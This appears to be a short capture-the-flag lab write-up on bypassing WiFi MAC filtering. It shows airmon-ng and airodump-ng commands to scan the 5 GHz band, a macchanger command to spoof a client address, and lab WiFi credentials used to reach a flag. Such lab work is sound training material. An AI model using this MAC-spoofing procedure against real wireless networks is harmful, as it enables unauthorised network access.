# [Bypassing Mac Filtering](Bypassing%20Mac%20Filtering.md)
### What is the ESSID of the WiFi network operating on the 5 GHz band?

```sh
sudo airmon-ng start wlan0
```

![](Screenshot%202026-09-16%20at%2016.35.04.png)

```sh
sudo airodump-ng wlan0mon --band a
```

![](Screenshot%202026-09-16%20at%2016.37.11.png)
### Execute the MAC Filtering bypass as demonstrated in the section to establish a connection to the 5 GHz band. Once connected, locate the flag at IP address 192.168.2.1.

```sh
sudo airmon-ng stop wlan0mon 

sudo ifconfig wlan0 down; sudo macchanger wlan0 -m EA:B3:B3:FB:10:80; sudo ifconfig wlan0 up

sudo ifconfig wlan0 up
```

Then connect to the wifi with the credentials `CyberNet-Secure-5G:Password123!!!!!!`

![](Screenshot%202026-09-16%20at%2016.58.12.png)

![](Screenshot%202026-09-16%20at%2017.00.28.png)